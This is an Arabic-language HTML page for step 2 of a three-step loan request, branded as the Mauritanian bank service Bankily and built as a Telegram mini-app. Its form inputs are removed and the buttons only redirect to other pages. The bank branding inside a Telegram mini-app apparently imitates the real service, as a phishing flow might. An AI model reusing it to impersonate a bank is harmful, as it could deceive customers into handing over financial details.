<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بنكيلي - طلب قرض</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <!-- Arabic Font -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">

    <style>
        :root {
            --bankily-teal: #007B88;
            --bankily-teal-dark: #005F69;
            --bankily-yellow: #E5A823;
            --bankily-yellow-hover: #C9901A;
            --bg-color: #f2f4f5;
            --card-bg: #ffffff;
            --text-main: #1a252c;
            --text-muted: #62727d;
            --btn-gray: #e8e8e8;
            --btn-gray-text: #555555;
        }

        * {
            box-sizing: border-box;
            font-family: 'Cairo', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
            text-align: right;
        }

        /* Top Header Navigation bar */
        .app-header {
            width: 100%;
            background-color: var(--bankily-teal);
            height: 60px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .back-btn-top {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            font-size: 20px;
            font-weight: 800;
            color: #ffffff;
        }

        .header-title span.yellow-text {
            color: var(--bankily-yellow);
            margin-right: 4px;
        }

        .menu-icon {
            font-size: 24px;
            cursor: pointer;
            color: white;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-icon span {
            display: block;
            width: 22px;
            height: 3px;
            background-color: white;
            border-radius: 2px;
        }

        /* Card Layout */
        .card {
            background: white;
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 123, 136, 0.08);
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 26px;
            color: var(--text-main);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .subtext {
            font-size: 14px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 20px;
        }

        /* Step Progress Bar */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 0 auto 32px;
            width: 80%;
        }

        .step-bar {
            flex: 1;
            height: 4px;
            background-color: #e2e8f0;
            border-radius: 2px;
        }

        .step-bar.active {
            background-color: var(--bankily-teal);
        }

        /* Buttons Container */
        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 0.5px;
            transition: background-color 0.2s;
        }

        .btn-prev:hover {
            background-color: #dddddd;
        }

        .btn-next {
            background-color: var(--bankily-yellow);
            color: #000000;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            letter-spacing: 0.5px;
            transition: background-color 0.2s;
        }

        .btn-next:hover {
            background-color: var(--bankily-yellow-hover);
        }

        .btn-next:active, .btn-prev:active {
            opacity: 0.9;
        }

        /* Bottom Footer Banner */
        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #666666;
            margin-top: auto;
        }
    </style>
</head>

<body>

<!-- Header Navigation Bar -->
<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">رجوع →</a>
    <div class="header-title">
        Bankily <span class="yellow-text">بنكيلي</span>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">طلب قرض</h1>
    <div class="subtext">الخطوة 2 من 3</div>

    <!-- Step Bar Progress Indicators (Steps 1 & 2 Active) -->
    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <!-- Form Container (Inputs removed) -->
    <form id="step2Form" onsubmit="goNext(event)">
        <div class="btn-container">
            <button type="submit" class="btn-next">الخطوة التالية</button>
            <button type="button" class="btn-prev" onclick="goBack()">السابق</button>
        </div>
    </form>
</div>

<!-- Footer -->
<div class="footer-banner">
    © 2026 بنكيلي - البنك الشعبي الموريتاني
</div>

<script>
    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }
    };

    function goNext(event) {
        event.preventDefault();
        window.location.href = "/page4";
    }

    function goBack() {
        window.location.href = "/page2";
    }
</script>

</body>
</html>
